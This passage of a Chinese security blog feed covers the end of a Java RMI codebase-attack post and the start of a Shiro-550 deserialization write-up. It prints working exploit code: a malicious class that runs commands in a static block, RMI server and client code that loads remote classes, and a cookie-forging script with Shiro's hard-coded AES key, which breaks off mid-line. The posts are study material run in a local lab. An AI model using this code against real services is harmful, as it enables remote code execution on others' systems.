6u45、7u21之后，需要设置useCodebaseOnly</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置policy文件以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>,<span class="string">&quot;D://java.policy&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启RMISecurityManager</span></span><br><span class="line">        <span class="type">RMISecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        stub.vulnFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>先运行HTTPServer启动代码，起一个codebase，然后运行Server端启动代码，再运行Client端启动代码<br>成功执行HTTPServer的恶意返回结果子类的静态代码块。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695169373115-8cd40489-01fd-40f3-86a3-950eb76d73aa.png" alt="image.png"></p><h3 id="攻击Server端"><a href="#攻击Server端" class="headerlink" title="攻击Server端"></a>攻击Server端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;new http request from &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot; &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> HTTPServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.<span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;String HTTP Server on port: 8000&quot;</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HTTPServer</span>());</span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloObject</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line">        <span class="comment">// JDK 6u45、7u21之后，需要设置useCodebaseOnly</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置policy文件以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>,<span class="string">&quot;D://java.policy&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启RMISecurityManager</span></span><br><span class="line">        <span class="type">RMISecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">// 设置codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectImpl</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloObject</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">extends</span> <span class="title class_">HelloObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        <span class="type">ExportObject</span> <span class="variable">exportObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExportObject</span>();</span><br><span class="line">        stub.vulnFunc(exportObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先运行HTTPServer启动代码，起一个codebase，然后运行Server端启动代码，再运行Client端启动代码<br>成功执行HTTPServer的恶意参数子类的静态代码块。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695173375232-078b872d-2b1a-4173-8db1-bc1aea7d36f3.png" alt="image.png"></p><h1 id="JEP290-绕过"><a href="#JEP290-绕过" class="headerlink" title="JEP290 绕过"></a>JEP290 绕过</h1><p><strong>TODO</strong></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>源码分析<br><a href="https://www.bilibili.com/video/BV1L3411a7ax">https://www.bilibili.com/video/BV1L3411a7ax</a><br><a href="https://su18.org/post/rmi-attack">https://su18.org/post/rmi-attack</a><br><a href="https://tttang.com/archive/1530/">https://tttang.com/archive/1530/</a><br><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p><p>攻击面<br><a href="https://paper.seebug.org/1091">https://paper.seebug.org/1091</a><br><a href="https://su18.org/post/rmi-attack">https://su18.org/post/rmi-attack</a><br><a href="https://goodapple.top/archives/520">https://goodapple.top/archives/520</a><br><a href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a><br><a href="https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8">https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8</a><br><a href="https://www.anquanke.com/post/id/257452">https://www.anquanke.com/post/id/257452</a><br><a href="https://xz.aliyun.com/t/7930">https://xz.aliyun.com/t/7930</a><br><a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;时间有限，目前只跟完了RMI的源码分析部分，攻击和绕过只有下周再来了。&lt;br&gt;不过跟源码也已经发现了一些有意思的反序列化点，也算是为后面学习</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="RMI" scheme="https://jaspersec.top/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>shiro550反序列化</title>
    <link href="https://jaspersec.top/posts/1790070300.html"/>
    <id>https://jaspersec.top/posts/1790070300.html</id>
    <published>2023-12-24T00:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.bilibili.com/video/BV1iF411b7bD">https://www.bilibili.com/video/BV1iF411b7bD</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>搭环境看的这位师傅的，有图有步骤，爱了。<br><a href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/">https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>shiro550在hvv的时候就有所耳闻，每次看一个Java站都要看看有没有rememberMe<br>一句话说这个洞：就是rememberMe传了个经过AES加密+Base64的序列化字符串，但是Shiro里这个密钥是固定的，那我们用同样的密钥加密和Base64，传恶意的序列化字符串，后台反序列化就会被打了。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992080953-6b62c209-4e3b-4b03-96c1-bbdfecf0ac0f.png" alt="image.png"></p><h2 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h2><p>尝试复现漏洞发现者，最初发现这个洞时的思路。<br>首先，抓包看到Cookie里的rememberMe有一大串，一般来说不会有这么多，于是猜测可能是传了序列化的对象<br>idea里双击”shift”，搜索”cookie”，找到CookieRememberMeManager这个类</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992887524-557ba65b-ed87-4f55-a704-ad2bd87bda38.png" alt="image.png"></p><p>然后发现有两个函数带了remember字样，很可能是要找的函数</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993027704-1fe5d6b6-592d-4e58-ad3d-018237120d85.png" alt="image.png"></p><p>看注释，发现getRememberedSerializedIdentity是对Cookie里的rememberMe的值进行Base64解码的</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993320541-821444e6-7d17-4934-b21c-91c109b8cfd4.png" alt="image.png"></p><p>我们的目的是探索这个字段是否可反序列化，接下来看谁调用了getRememberedSerializedIdentity，目的是看看base64解码之后，下一步是干什么。<br>这里可以看到，抽象父类的getRememberedPrincipals方法调了getRememberedSerializedIdentity</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993460074-cb9159c9-eab2-422a-ab7f-fce86ad8cb65.png" alt="image.png"></p><p>继续看getRememberedSerializedIdentity，发现它把字符串base64decode后，把结果传到了convertBytesToPrincipals这个函数里</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993648270-680fd33a-714f-4d78-b710-dc94bbd244ba.png" alt="image.png"></p><p>再跟进convertBytesToPrincipals这个函数，发现里边有个decrypt()函数，这显然是在对字符串解密<br>在字符串解密之后，直接传到deserialize()函数里，参与反序列化！<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993682635-12e6390e-c231-49b8-966e-83d446e7293a.png" alt="image.png"><br>下面看它怎么解密的，跟进decrypt，注意到这里有个获取解密密钥的函数<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996088166-7a0f4482-6860-49fb-bcca-bac1f4060f4f.png" alt="image.png"><br>跟进去getDecryptionCipherKey，他是直接返回AbstractRememberMeManager的decryptionCipherKey属性</p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996362214-cbacfc97-1239-4c2f-98d4-2499091e1cce.png" alt="image.png" style="zoom:150%;" /><p>下面找找哪里给decryptionCipherKey赋值了，idea小技巧，”value write”里都是赋值函数<br>这里找到setDecryptionCipherKey()函数，它把传入的参数赋值给decryptionCipherKey，但是没写参数哪来的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997055979-52da1b14-24a8-4d88-8cd0-e8aab0d771bb.png" alt="image.png"><br>再找谁调用了setDecryptionCipherKey()，找到了setCipherKey()函数，这里还是没写参数哪来的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997415675-6e10db0f-0211-4675-882d-04c26d5bd3ea.png" alt="image.png"><br>再往上找，终于找到了，默认的密钥就是这个DEFAULT_CIPHER_KEY_BYTES<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997502363-4a93b71c-4cba-4f29-8e24-4167ec69462a.png" alt="image.png"><br>看注释，可以看到Shiro在这里采用AES+Base64来加密我们序列化之后的字符串<br>问题也就出在这，他这里把对称加密的密钥写死了，知道密钥，AES加密就相当于没有<br>我们按照它的构造规则，先AES再Base64，就可以打它的反序列化了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997565433-9589bc80-6c1a-4df4-a756-ae68adc97e4e.png" alt="image.png"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据组长的视频，讲了三种利用方式：</p><ul><li>URLDNS链：JDK自带，不需要依赖，但是只能SSRF，不能RCE</li><li>CC8链：CC2+CC6，需要用到Commons Collections3，能RCE</li><li>CB1链：Shiro自带CB依赖，能直接RCE</li></ul><p>cookie加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36</span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: VSCode</span></span><br><span class="line"><span class="comment"># @Blog    ：https://drun1baby.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同目录下放已经反序列化的文件object.ser，通过AES和BASE64加密生成rememberMe的cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span 